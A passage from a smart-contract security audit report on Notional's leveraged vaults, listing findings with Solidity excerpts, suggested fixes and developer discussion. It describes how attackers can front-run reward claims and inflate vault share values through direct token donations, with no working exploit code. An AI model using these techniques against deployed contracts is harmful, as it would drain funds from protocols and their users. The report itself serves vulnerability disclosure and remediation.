function _claimRewardToken(
        address rewardToken,
        address account,
        uint256 vaultSharesBefore,
        uint256 vaultSharesAfter,
        uint256 rewardsPerVaultShare
    ) internal returns (uint256 rewardToClaim) {
        rewardToClaim = _getRewardsToClaim(
            rewardToken, account, vaultSharesBefore, rewardsPerVaultShare
        );

-        VaultStorage.getAccountRewardDebt()[rewardToken][account] = (
-            (vaultSharesAfter * rewardsPerVaultShare) /
-                uint256(Constants.INTERNAL_TOKEN_PRECISION)
-        );

        if (0 < rewardToClaim) {
            // Ignore transfer errors here so that any strange failures here do not
            // prevent normal vault operations from working. Failures may include a
            // lack of balances or some sort of blacklist that prevents an account
            // from receiving tokens.
            try IEIP20NonStandard(rewardToken).transfer(account, rewardToClaim) {
                bool success = TokenUtils.checkReturnCode();
                if (success) {
+                   VaultStorage.getAccountRewardDebt()[rewardToken][account] = (
+                  (vaultSharesAfter * rewardsPerVaultShare) /
+                  uint256(Constants.INTERNAL_TOKEN_PRECISION)
+                  );
                    emit VaultRewardTransfer(rewardToken, account, rewardToClaim);
                } else {
                    emit VaultRewardTransfer(rewardToken, account, 0);
                }
            // Emits zero tokens transferred if the transfer fails.
            } catch {
                emit VaultRewardTransfer(rewardToken, account, 0);
            }
        }
    }
```

# Issue M-2: Users can deny the vault from claiming reward tokens 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/63 

## Found by 
DenTonylifer, xiaoming90
## Summary

Users can deny the vault from claiming reward tokens by front-running the `_claimVaultRewards` function.

## Vulnerability Detail

The `_claimVaultRewards` function will call the `_executeClaim` function to retrieve the reward tokens from the external protocols (e.g., Convex or Aura). The reward tokens will be transferred directly to the vault contract. The vault computes the number of reward tokens claimed by taking the difference of the before and after balance.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L174

```solidity
File: VaultRewarderLib.sol
148:     function _claimVaultRewards(
..SNIP..
152:     ) internal {
153:         uint256[] memory balancesBefore = new uint256[](state.length);
154:         // Run a generic call against the reward pool and then do a balance
155:         // before and after check.
156:         for (uint256 i; i < state.length; i++) {
157:             // Presumes that ETH will never be given out as a reward token.
158:             balancesBefore[i] = IERC20(state[i].rewardToken).balanceOf(address(this));
159:         }
160: 
161:         _executeClaim(rewardPool);
..SNIP..
168:         for (uint256 i; i < state.length; i++) {
169:             uint256 balanceAfter = IERC20(state[i].rewardToken).balanceOf(address(this));
170:             _accumulateSecondaryRewardViaClaim(
171:                 i,
172:                 state[i],
173:                 // balanceAfter should never be less than balanceBefore
174:                 balanceAfter - balancesBefore[i],
175:                 totalVaultSharesBefore
176:             );
177:         }
178:     }
```

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L181

```solidity
File: VaultRewarderLib.sol
181:     function _executeClaim(RewardPoolStorage memory r) internal {
182:         if (r.poolType == RewardPoolType.AURA) {
183:             require(IAuraRewardPool(r.rewardPool).getReward(address(this), true));
184:         } else if (r.poolType == RewardPoolType.CONVEX_MAINNET) {
185:             require(IConvexRewardPool(r.rewardPool).getReward(address(this), true));
186:         } else if (r.poolType == RewardPoolType.CONVEX_ARBITRUM) {
187:             IConvexRewardPoolArbitrum(r.rewardPool).getReward(address(this));
188:         } else {
189:             revert();
190:         }
191:     }
```

However, the `getReward` function of the external protocols can be executed by anyone. Refer to Appendix A for the actual implementation of the `getReward` function.

As a result, malicious users can front-run the `_claimVaultRewards` transaction and trigger the `getReward` function of the external protocols directly, resulting in the reward tokens to be sent to the vault before the `_claimVaultRewards` is executed.

When the `_claimVaultRewards` function is executed, the before/after snapshot will ultimately claim the zero amount. The code ` balanceAfter - balancesBefore[i]` at Line 174 above will always produce zero if the call to `_claimVaultRewards` is front-run.

As a result, reward tokens are forever lost in the contract.

## Impact

High as this issue is the same [this issue](https://github.com/sherlock-audit/2023-03-notional-judging/issues/200) in the past Notional V3 contest.

Loss of assets as the reward tokens intended for Notional and its users are lost.

## Code Snippet

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L174

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L181

## Tool used

Manual Review

## Recommendation

Consider using the entire balance instead of the difference between before and after balances.

## Appendix A - `getReward` of Convex and Aura's reward pool contract

**Aura's Reward Pool on Mainnet**

https://etherscan.io/address/0x44D8FaB7CD8b7877D5F79974c2F501aF6E65AbBA#code#L980 

```solidity
     function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){
        uint256 reward = earned(_account);
        if (reward > 0) {
            rewards[_account] = 0;
            rewardToken.safeTransfer(_account, reward);
            IDeposit(operator).rewardClaimed(pid, _account, reward);
            emit RewardPaid(_account, reward);
        }

        //also get rewards from linked rewards
        if(_claimExtras){
            for(uint i=0; i < extraRewards.length; i++){
                IRewards(extraRewards[i]).getReward(_account);
            }
        }
        return true;
    }
```

**Aura's Reward Pool on Arbitrum**

https://arbiscan.io/address/0x17F061160A167d4303d5a6D32C2AC693AC87375b#code#F15#L296

```solidity
  /**
     * @dev Gives a staker their rewards, with the option of claiming extra rewards
     * @param _account     Account for which to claim
     * @param _claimExtras Get the child rewards too?
     */
    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){
        uint256 reward = earned(_account);
        if (reward > 0) {
            rewards[_account] = 0;
            rewardToken.safeTransfer(_account, reward);
            IDeposit(operator).rewardClaimed(pid, _account, reward);
            emit RewardPaid(_account, reward);
        }

        //also get rewards from linked rewards
        if(_claimExtras){
            for(uint i=0; i < extraRewards.length; i++){
                IRewards(extraRewards[i]).getReward(_account);
            }
        }
        return true;
    }
```

**Convex's Reward Pool on Arbitrum**

https://arbiscan.io/address/0x93729702Bf9E1687Ae2124e191B8fFbcC0C8A0B0#code#F1#L337

```solidity
    //claim reward for given account (unguarded)
    function getReward(address _account) external {
        //check if there is a redirect address
        if(rewardRedirect[_account] != address(0)){
            _checkpoint(_account, rewardRedirect[_account]);
        }else{
            //claim directly in checkpoint logic to save a bit of gas
            _checkpoint(_account, _account);
        }
    }
```

#### Convex for Mainnet

https://etherscan.io/address/0xD1DdB0a0815fD28932fBb194C84003683AF8a824#code#L980

```solidity
    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){
        uint256 reward = earned(_account);
        if (reward > 0) {
            rewards[_account] = 0;
            rewardToken.safeTransfer(_account, reward);
            IDeposit(operator).rewardClaimed(pid, _account, reward);
            emit RewardPaid(_account, reward);
        }

        //also get rewards from linked rewards
        if(_claimExtras){
            for(uint i=0; i < extraRewards.length; i++){
                IRewards(extraRewards[i]).getReward(_account);
            }
        }
        return true;
    }
```

# Issue M-3: Value of vault shares can be manipulated 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/67 

## Found by 
xiaoming90
## Summary

The value of vault shares can be manipulated. Inflating the value of vault shares is often the precursor of more complex attacks. Internal (Notional-side) or external protocols that integrate with the vault shares might be susceptible to potential attacks in the future that exploit this issue.

## Vulnerability Detail

It was found that the value of the vault shares can be manipulated.

##### Instance 1 - Kelp

To increase the value of vault share, malicious can directly transfer a large number of stETH to their `KelpCooldownHolder` contract. In Line 78, the holder contract will determine the number of stETH to be withdrawn from LIDO via `IERC20(stETH).balanceOf(address(this))`. This means that all the stETH tokens residing on the holder contract, including the ones that are maliciously transferred in, will be withdrawn from LIDO.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L78

```solidity
File: Kelp.sol
69:     /// @notice this method need to be called once withdraw on Kelp is finalized
70:     /// to start withdraw process from Lido so we can unwrap stETH to ETH
71:     /// since we are not able to withdraw ETH directly from Kelp
72:     function triggerExtraStep() external {
73:         require(!triggered);
74:         (/* */, /* */, /* */, uint256 userWithdrawalRequestNonce) = WithdrawManager.getUserWithdrawalRequest(stETH, address(this), 0);
75:         require(userWithdrawalRequestNonce < WithdrawManager.nextLockedNonce(stETH));
76: 
77:         WithdrawManager.completeWithdrawal(stETH);
78:         uint256 tokensClaimed = IERC20(stETH).balanceOf(address(this));
79: 
80:         uint256[] memory amounts = new uint256[](1);
81:         amounts[0] = tokensClaimed;
82:         IERC20(stETH).approve(address(LidoWithdraw), amounts[0]);
83:         LidoWithdraw.requestWithdrawals(amounts, address(this));
84: 
85:         triggered = true;
86:     }
```

When determining the value of vault share of a user, the `convertStrategyToUnderlying` function will be called, which internally calls `_getValueOfWithdrawRequest` function.

The `withdrawsStatus[0].amountOfStETH` at Line 126 will be inflated as the amount will include the stETH attackers maliciously transferred earlier. As a result, the vault share will be inflated.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L126

```solidity
File: Kelp.sol
114:     function _getValueOfWithdrawRequest(
115:         WithdrawRequest memory w,
116:         address borrowToken,
117:         uint256 borrowPrecision
118:     ) internal view returns (uint256) {
119:         address holder = address(uint160(w.requestId));
120: 
121:         uint256 expectedStETHAmount;
122:         if (KelpCooldownHolder(payable(holder)).triggered()) {
123:             uint256[] memory requestIds = LidoWithdraw.getWithdrawalRequests(holder);
124:             ILidoWithdraw.WithdrawalRequestStatus[] memory withdrawsStatus = LidoWithdraw.getWithdrawalStatus(requestIds);
125: 
126:             expectedStETHAmount = withdrawsStatus[0].amountOfStETH;
127:         } else {
128:             (/* */, expectedStETHAmount, /* */, /* */) = WithdrawManager.getUserWithdrawalRequest(stETH, holder, 0);
129: 
130:         }
131: 
132:         (int256 stETHToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(
133:             address(stETH), borrowToken
134:         );
135: 
136:         return (expectedStETHAmount * stETHToBorrowRate.toUint() * borrowPrecision) /
137:             (Constants.EXCHANGE_RATE_PRECISION * stETH_PRECISION);
138:     }
```

#### Instance 2 - Ethena

Etherna vault is vulnerable to similar issue due to the due of `.balanceOf` at Line 37 below.

Before starting the cooldown, malicious user can directly transfer in a large number of sUSDe to the `EthenaCooldownHolder` holder contract.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L37

```solidity
File: Ethena.sol
35:     function _startCooldown() internal override {
36:         uint24 duration = sUSDe.cooldownDuration();
37:         uint256 balance = sUSDe.balanceOf(address(this));
38:         if (duration == 0) {
39:             // If the cooldown duration is set to zero, can redeem immediately
40:             sUSDe.redeem(balance, address(this), address(this));
41:         } else {
42:             // If we execute a second cooldown while one exists, the cooldown end
43:             // will be pushed further out. This holder should only ever have one
44:             // cooldown ever.
45:             require(sUSDe.cooldowns(address(this)).cooldownEnd == 0);
46:             sUSDe.cooldownShares(balance);
47:         }
48:     }
```

Thus, when code in Lines 87 and 99 are executed, the `userCooldown.underlyingAmount` returns will be large, which inflates the value of the vault shares.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L77

```solidity
File: Ethena.sol
077:     function _getValueOfWithdrawRequest(
078:         WithdrawRequest memory w,
079:         address borrowToken,
080:         uint256 borrowPrecision
081:     ) internal view returns (uint256) {
082:         address holder = address(uint160(w.requestId));
083:         // This valuation is the amount of USDe the account will receive at cooldown, once
084:         // a cooldown is initiated the account is no longer receiving sUSDe yield. This balance
085:         // of USDe is transferred to a Silo contract and guaranteed to be available once the
086:         // cooldown has passed.
087:         IsUSDe.UserCooldown memory userCooldown = sUSDe.cooldowns(holder);
088: 
089:         int256 usdeToBorrowRate;
090:         if (borrowToken == address(USDe)) {
091:             usdeToBorrowRate = int256(Constants.EXCHANGE_RATE_PRECISION);
092:         } else {
093:             // If not borrowing USDe, convert to the borrowed token
094:             (usdeToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(
095:                 address(USDe), borrowToken
096:             );
097:         }
098: 
099:         return (userCooldown.underlyingAmount * usdeToBorrowRate.toUint() * borrowPrecision) /
100:             (Constants.EXCHANGE_RATE_PRECISION * USDE_PRECISION);
101:     }
```

## Impact

Inflating the value of vault shares is often the precursor of more complex attacks. Internal (Notional-side) or external protocols that integrate with the vault shares might be susceptible to potential attacks in the future that exploit this issue.

## Code Snippet

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L78

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L126

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L37

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L77

## Tool used

Manual Review

## Recommendation

**Instance 1 - Kelp**

Consider using the before and after balances to determine the actual number of stETH obtained after the execution of `WithdrawManager.completeWithdrawal` function to guard against potential donation attacks.

```diff
function triggerExtraStep() external {
    require(!triggered);
    (/* */, /* */, /* */, uint256 userWithdrawalRequestNonce) = WithdrawManager.getUserWithdrawalRequest(stETH, address(this), 0);
    require(userWithdrawalRequestNonce < WithdrawManager.nextLockedNonce(stETH));
+		uint256 tokenBefore = IERC20(stETH).balanceOf(address(this));
    WithdrawManager.completeWithdrawal(stETH);
+		uint256 tokenAfter = IERC20(stETH).balanceOf(address(this));

-    uint256 tokensClaimed = IERC20(stETH).balanceOf(address(this));
+    uint256 tokensClaimed = tokenAfter - tokenBefore

    uint256[] memory amounts = new uint256[](1);
    amounts[0] = tokensClaimed;
    IERC20(stETH).approve(address(LidoWithdraw), amounts[0]);
    LidoWithdraw.requestWithdrawals(amounts, address(this));

    triggered = true;
}
```

**Instance 2 - Ethena**

Pass in the actual amount of sUSDe that needs to be withdrawn instead of using the `balanceOf`.

```diff
- function _startCooldown() internal override {
+ function _startCooldown(uint256 balance) internal override {
    uint24 duration = sUSDe.cooldownDuration();
-    uint256 balance = sUSDe.balanceOf(address(this));
    if (duration == 0) {
        // If the cooldown duration is set to zero, can redeem immediately
        sUSDe.redeem(balance, address(this), address(this));
    } else {
        // If we execute a second cooldown while one exists, the cooldown end
        // will be pushed further out. This holder should only ever have one
        // cooldown ever.
        require(sUSDe.cooldowns(address(this)).cooldownEnd == 0);
        sUSDe.cooldownShares(balance);
    }
}
```


# Issue M-4: The withdrawValue calculation in _calculateValueOfWithdrawRequest is incorrect. 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/78 

## Found by 
ZeroTrust
The withdrawValue calculation in _calculateValueOfWithdrawRequest is incorrect.
## Summary
The withdrawValue calculation in _calculateValueOfWithdrawRequest is incorrect.
## Vulnerability Detail
```javascript
function _calculateValueOfWithdrawRequest(
        WithdrawRequest memory w,
        uint256 stakeAssetPrice,
        address borrowToken,
        address redeemToken
    ) internal view returns (uint256 borrowTokenValue) {
        if (w.requestId == 0) return 0;

        // If a withdraw request has split and is finalized, we know the fully realized value of
        // the withdraw request as a share of the total realized value.
        if (w.hasSplit) {
            SplitWithdrawRequest memory s = VaultStorage.getSplitWithdrawRequest()[w.requestId];
            if (s.finalized) {
                return _getValueOfSplitFinalizedWithdrawRequest(w, s, borrowToken, redeemToken);
            }
        }

        // In every other case, including the case when the withdraw request has split, the vault shares
        // in the withdraw request (`w`) are marked at the amount of vault shares the account holds.
@>>        return _getValueOfWithdrawRequest(w, stakeAssetPrice);
    }
```
We can see that for cases without hasSplit or with hasSplit but not finalized, the value is calculated using _getValueOfWithdrawRequest. Let’s take a look at `PendlePTEtherFiVault::_getValueOfWithdrawRequest()`.

```javascript
function _getValueOfWithdrawRequest(
        WithdrawRequest memory w, uint256 /* */
    ) internal override view returns (uint256) {
@>>        uint256 tokenOutSY = getTokenOutSYForWithdrawRequest(w.requestId);
        // NOTE: in this vault the tokenOutSy is known to be weETH.
        (int256 weETHPrice, /* */) = TRADING_MODULE.getOraclePrice(TOKEN_OUT_SY, BORROW_TOKEN);
        return (tokenOutSY * weETHPrice.toUint() * BORROW_PRECISION) /
            (WETH_PRECISION * Constants.EXCHANGE_RATE_PRECISION);
    }
```
Here, tokenOutSY represents the total amount of WETH requested for withdrawal, not just the portion represented by the possibly split w.vaultShares. Therefore, _getValueOfWithdrawRequest returns the entire withdrawal value. If a WithdrawRequest has been split but not finalized, this results in an incorrect calculation.

This issue also occurs in `PendlePTKelpVault::_getValueOfWithdrawRequest()`.
```javascript
function _getValueOfWithdrawRequest(
        WithdrawRequest memory w, uint256 /* */
    ) internal override view returns (uint256) {
        return KelpLib._getValueOfWithdrawRequest(w, BORROW_TOKEN, BORROW_PRECISION);
    }
//KelpLib._getValueOfWithdrawRequest) function
function _getValueOfWithdrawRequest(
        WithdrawRequest memory w,
        address borrowToken,
        uint256 borrowPrecision
    ) internal view returns (uint256) {
        address holder = address(uint160(w.requestId));

        uint256 expectedStETHAmount;
        if (KelpCooldownHolder(payable(holder)).triggered()) {
            uint256[] memory requestIds = LidoWithdraw.getWithdrawalRequests(holder);
            ILidoWithdraw.WithdrawalRequestStatus[] memory withdrawsStatus = LidoWithdraw.getWithdrawalStatus(requestIds);

            expectedStETHAmount = withdrawsStatus[0].amountOfStETH;
        } else {
            (/* */, expectedStETHAmount, /* */, /* */) = WithdrawManager.getUserWithdrawalRequest(stETH, holder, 0);

        }

        (int256 stETHToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(
            address(stETH), borrowToken
        );
            //@audit not the w.vaulteShares
@>>        return (expectedStETHAmount * stETHToBorrowRate.toUint() * borrowPrecision) /
            (Constants.EXCHANGE_RATE_PRECISION * stETH_PRECISION);
    }
```

This issue also occurs in `PendlePTStakedUSDeVault::_getValueOfWithdrawRequest()`.
```javascript
function _getValueOfWithdrawRequest(
        WithdrawRequest memory w, uint256 /* */
    ) internal override view returns (uint256) {
        // NOTE: This withdraw valuation is not based on the vault shares value so we do not
        // need to use the PendlePT metadata conversion.
        return EthenaLib._getValueOfWithdrawRequest(w, BORROW_TOKEN, BORROW_PRECISION);
    }
//EthenaLib._getValueOfWithdrawRequest()
function _getValueOfWithdrawRequest(
        WithdrawRequest memory w,
        address borrowToken,
        uint256 borrowPrecision
    ) internal view returns (uint256) {
        address holder = address(uint160(w.requestId));
        // This valuation is the amount of USDe the account will receive at cooldown, once
        // a cooldown is initiated the account is no longer receiving sUSDe yield. This balance
        // of USDe is transferred to a Silo contract and guaranteed to be available once the
        // cooldown has passed.
        IsUSDe.UserCooldown memory userCooldown = sUSDe.cooldowns(holder);

        int256 usdeToBorrowRate;
        if (borrowToken == address(USDe)) {
            usdeToBorrowRate = int256(Constants.EXCHANGE_RATE_PRECISION);
        } else {
            // If not borrowing USDe, convert to the borrowed token
            (usdeToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(
                address(USDe), borrowToken
            );
        }
        //@audit not the w.vaulteShares
@>>        return (userCooldown.underlyingAmount * usdeToBorrowRate.toUint() * borrowPrecision) /
            (Constants.EXCHANGE_RATE_PRECISION * USDE_PRECISION);
    }
```
The calculation is correct only in `EtherFiVault::_getValueOfWithdrawRequest()` .
```javascript
function _getValueOfWithdrawRequest(
        WithdrawRequest memory w, uint256 weETHPrice
    ) internal override view returns (uint256) {
        return EtherFiLib._getValueOfWithdrawRequest(w, weETHPrice, BORROW_PRECISION);
    }
//EtherFiLib._getValueOfWithdrawRequest() function
function _getValueOfWithdrawRequest(
        WithdrawRequest memory w,
        uint256 weETHPrice,
        uint256 borrowPrecision
    ) internal pure returns (uint256) {
            //@audit this is correct, using vaultShares
@>>        return (w.vaultShares * weETHPrice * borrowPrecision) /
            (uint256(Constants.INTERNAL_TOKEN_PRECISION) * Constants.EXCHANGE_RATE_PRECISION);
    }
```

## Impact
Overestimation of user assets can lead to scenarios where users should have been liquidated but were not, resulting in losses for the protocol.
## Code Snippet
https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L86

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/PendlePTEtherFiVault.sol#L46

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L114

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L77
## Tool used

Manual Review

## Recommendation
Modify the relevant calculation formulas.

# Issue M-5: No deadline protection from MEV 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/79 

The protocol has acknowledged this issue.

## Found by 
4b, Ironsidesec, MSaptarshi, pseudoArtist, sa9933, smbv-1923, zhuying
## Summary
The protocol uses `block.timestamp` as the deadline argument while executing swaps (`_executeTrade`), which completely defeats the purpose of using a deadline.

This issue is on 
1. [BaseStakingVault._redeemFromNotional](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/BaseStakingVault.sol#L170)
2. [BaseStakingVault._executeInstantRedemption](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/BaseStakingVault.sol#L197)
3. [EthenaVault._stakeTokens](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/EthenaVault.sol#L65)
4. [PendlePrincipalToken._stakeTokens](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L86)
5. [PendlePrincipalToken._executeInstantRedemption](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L155)
6. [Ethena._sellStakedUSDe](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L138-L158)


## Vulnerability Detail
Using block.timestamp as the deadline is effectively a no-operation that has no effect nor protection. Since `block.timestamp` will take the timestamp value when the transaction gets mined, the check will end up comparing block.timestamp against the same value, i.e. block.timestamp <= block.timestamp.

Passing block.timestamp as the expiry/deadline of an operation does not mean "require immediate execution" - it means "whatever block this transaction appears in, I'm comfortable with that block's timestamp". Providing this value means that a malicious miner can hold the transaction for as long as they like (think the flashbots mempool for bundling transactions), which may be until they are able to cause the transaction to incur the maximum amount of slippage allowed by the slippage parameter, or until conditions become unfavorable enough that other orders, e.g. liquidations, are triggered. Timestamps should be chosen off-chain, and should be specified by the caller to avoid unnecessary MEV.


## Impact
No MEV protection on using `block.timestamp` as deadline. Failure to provide a proper deadline value enables pending transactions to be maliciously executed at a later point. Transactions that provide an insufficient amount of gas such that they are not mined within a reasonable amount of time, can be picked by malicious actors or MEV bots and executed later in the detriment of the submitter.

See [this issue](https://github.com/code-423n4/2022-12-backed-findings/issues/64) for an excellent reference on the topic (the author runs an MEV bot).

## Code Snippet


```solidity
            Trade memory trade = Trade({
                tradeType: TradeType.EXACT_IN_SINGLE,
                sellToken: TOKEN_OUT_SY,
                buyToken: BORROW_TOKEN,
                amount: netTokenOut,
                limit: params.minPurchaseAmount,
    >>>>        deadline: block.timestamp,
                exchangeData: params.exchangeData
            });
```

## Tool used
Manual Review

## Recommendation
Add a deadline parameter to the input of functions used to execute swaps (`_executeTrade`). So that off-chain calculated deadline can be used against the MEV.



## Discussion

**jeffywu**

Reading the linked issue it does look like they downgraded the severity of this issue. To me, this is very much a theoretical vulnerability versus an actual one, similar to the ERC20 transfer approval set to zero front running "issue". The user is protected on a downside price movement and they have the ability to resubmit at a higher gas price to get immediate execution.

# Issue M-6: The _getValueOfWithdrawRequest function uses different methods for selecting assets in various vaults. 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/80 

## Found by 
ZeroTrust

## Summary
The _getValueOfWithdrawRequest function uses different methods for selecting assets in various vaults.
## Vulnerability Detail
```javascript
 function _getValueOfWithdrawRequest(
        WithdrawRequest memory w, uint256 /* */
    ) internal override view returns (uint256) {
        uint256 tokenOutSY = getTokenOutSYForWithdrawRequest(w.requestId);
        // NOTE: in this vault the tokenOutSy is known to be weETH.
        (int256 weETHPrice, /* */) = TRADING_MODULE.getOraclePrice(TOKEN_OUT_SY, BORROW_TOKEN);
@>>        return (tokenOutSY * weETHPrice.toUint() * BORROW_PRECISION) /
            (WETH_PRECISION * Constants.EXCHANGE_RATE_PRECISION);
    }
```
In PendlePTEtherFiVault, weETH is used to withdraw eETH from the EtherFi protocol. Since eETH is still in a waiting period, the value of the withdrawal request is calculated using the price and quantity of weETH.
```javascript
function _getValueOfWithdrawRequest(
        WithdrawRequest memory w,
        address borrowToken,
        uint256 borrowPrecision
    ) internal view returns (uint256) {
        address holder = address(uint160(w.requestId));

        uint256 expectedStETHAmount;
        if (KelpCooldownHolder(payable(holder)).triggered()) {
            uint256[] memory requestIds = LidoWithdraw.getWithdrawalRequests(holder);
            ILidoWithdraw.WithdrawalRequestStatus[] memory withdrawsStatus = LidoWithdraw.getWithdrawalStatus(requestIds);

            expectedStETHAmount = withdrawsStatus[0].amountOfStETH;
        } else {
@>>            (/* */, expectedStETHAmount, /* */, /* */) = WithdrawManager.getUserWithdrawalRequest(stETH, holder, 0);

        }

        (int256 stETHToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(
            address(stETH), borrowToken
        );

        return (expectedStETHAmount * stETHToBorrowRate.toUint() * borrowPrecision) /
            (Constants.EXCHANGE_RATE_PRECISION * stETH_PRECISION);
    }
```
However, in PendlePTKelpVault, rsETH is used to withdraw stETH from the Kelp protocol. Similarly Since stETH is still in a waiting period, But the value of the withdrawal request is calculated using the expected amount and price of stETH(not rsETH).
```javascript
   function _getValueOfWithdrawRequest(
        WithdrawRequest memory w,
        address borrowToken,
        uint256 borrowPrecision
    ) internal view returns (uint256) {
        address holder = address(uint160(w.requestId));
        // This valuation is the amount of USDe the account will receive at cooldown, once
        // a cooldown is initiated the account is no longer receiving sUSDe yield. This balance
        // of USDe is transferred to a Silo contract and guaranteed to be available once the
        // cooldown has passed.
        IsUSDe.UserCooldown memory userCooldown = sUSDe.cooldowns(holder);

        int256 usdeToBorrowRate;
        if (borrowToken == address(USDe)) {
            usdeToBorrowRate = int256(Constants.EXCHANGE_RATE_PRECISION);
        } else {
            // If not borrowing USDe, convert to the borrowed token
            (usdeToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(
                address(USDe), borrowToken
            );
        }

@>>        return (userCooldown.underlyingAmount * usdeToBorrowRate.toUint() * borrowPrecision) /
            (Constants.EXCHANGE_RATE_PRECISION * USDE_PRECISION);
    }
```
Similarly, in PendlePTStakedUSDeVault, sUSDe is used to withdraw USDe from the Ethena protocol. Since USDe is still in a waiting period, the value of the withdrawal request is calculated using the expected amount and price of USDe(not sUSDe).

To summarize, PendlePTEtherFiVault uses the asset’s value before redemption for the calculation, while the other two vaults use the expected asset value after redemption. One of these methods is incorrect. The incorrect calculation method affects the asset value assessment of users in the fund, which in turn impacts whether a user should be liquidated.
## Impact
The incorrect calculation method affects the asset value assessment of users in the fund, which in turn impacts whether a user should be liquidated.
## Code Snippet
https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/PendlePTEtherFiVault.sol#L46

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L114

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L77
## Tool used

Manual Review

## Recommendation
Choose a consistent approach for value assessment, either using the token before withdrawal or the token received after withdrawal.



## Discussion

**T-Woodward**

The watson has correctly pointed out an inconsistency in the valuation methodology for withdrawal requests in these different vaults, but that inconsistency in and of itself is not a vulnerability.

He asserts that because we use two different methodologies, one must be wrong and one must be right. Therefore, he has shown that we have done something wrong with a critical part of the code and he deserves a bounty.

This line of reasoning is flawed. Neither approach is right, and neither is wrong. There is not an objectively correct way to value these withdrawal requests. For this to be a valid finding, we would need to see evidence that one of these valuation methodologies is actually exploitable / results in negative consequences. The watson has not shown that.

While consistency in this valuation methodology would be generally preferable, these are all different vaults with different assets that work different ways. The valuation methodology should match the problem at hand and should not just be consistent for the sake of consistency.

HOWEVER, having said all this, I looked further into the rsETH withdrawal request valuation and have concluded that we should change it because rsETH is slashable before it resolves to stETH, just like weETH. So in this case, we should switch the valuation methodology to match weETH. The sUSDe methodology still makes sense imo though because once the cooldown has started you know exactly how many USDe you will get and that won't change.

I'm not sure whether the watson deserves credit here. If we hadn't found the rsETH thing, I would have said no. But we did find the rsETH thing because of this issue report even though the watson didn't find it himself. Will let the judge decide.

**T-Woodward**

Think that if the watson does get a valid finding out of this, should be a medium severity at most. Once an account is in the withdrawal queue their account is locked until the withdrawal finalizes, so there's no way they could take advantage of a mispricing anyway.

**mystery0x**

